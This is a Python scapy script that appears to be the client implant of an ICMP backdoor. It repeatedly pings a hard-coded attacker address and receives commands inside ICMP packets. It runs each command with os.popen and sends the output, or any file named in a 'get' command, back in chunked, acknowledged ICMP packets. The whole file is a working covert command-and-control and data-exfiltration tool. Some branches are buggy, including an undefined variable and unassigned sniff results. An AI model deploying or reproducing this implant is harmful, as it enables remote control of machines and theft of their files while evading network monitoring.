from scapy.all import *
import subprocess
import os
import time

Att_ip="192.168.1.30"
ICMP_ID_HELO = 23144
ICMP_ID = 13331
is_ready = False
TTL = int(64)
my_iface =  "ens160"
frag_size = 40

  
def beac_n_listen():
    mtu = 1400
    while True:
        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8) / "FREETOTALK")
        pkt = sniff(filter="icmp", count=1, timeout = 3)
        if pkt:
            payload = pkt[0][IP].payload.load.decode('utf-8')
            first_word = payload.split()[0]

            if first_word == "get":
                curr_seq = 1
                file = open(payload.split()[1], 'rb') 
                while True:  
                    chunk = file.read(mtu)        
                    if not chunk: 
                        break 
                    while True:
                        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / chunk)
                        # sniff till you get an ok for certain part
                        pkt = sniff(filter="icmp", count=1, timeout=3)
                        if pkt:
                            if pkt[0][ICMP].seq == curr_seq:
                                curr_seq = curr_seq + 1
                                break
                while True:
                    send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / "end")
                    sniff(filter="icmp", count=1, timeout = 3)
                    if pkt:
                        if pkt[0][ICMP].seq == curr_seq:
                            break
                else:
                    while True:
                        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / res)
                        pkt = sniff(filter="icmp", count=1, timeout=3)
                        if pkt:
                            if pkt[0][ICMP].seq == curr_seq:
                                curr_seq = curr_seq + 1
                                break
                    while True:
                            send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / "end")
                            sniff(filter="icmp", count=1, timeout = 3)
                            if pkt:
                                if pkt[0][ICMP].seq == curr_seq:
                                    break
            else:
                res = os.popen(payload).read()
                curr_seq = 1

                if len(res) > mtu:
                    for i in range(0,len(res), mtu ):
                        data = res[i:i+mtu]
                        while True:
                            send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / data)
                            # sniff till you get an ok for certain part
                            pkt = sniff(filter="icmp", count=1, timeout=3)
                            if pkt:
                                if pkt[0][ICMP].seq == curr_seq:
                                    curr_seq = curr_seq + 1
                                    break
                else:
                    while True:
                        send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / res)
                        sniff(filter="icmp", count=1, timeout = 3)
                        if pkt:
                            if pkt[0][ICMP].seq == curr_seq:
                                curr_seq = curr_seq + 1
                                break
                #ending conversation
                while True:
                    send(IP(dst=Att_ip) / ICMP(id=ICMP_ID, type=8, seq=curr_seq) / "end")
                    sniff(filter="icmp", count=1, timeout = 3)
                    if pkt:
                        if pkt[0][ICMP].seq == curr_seq:
                            break
                


                




def main():
    beac_n_listen()
     


if __name__ == "__main__":
    main()






 
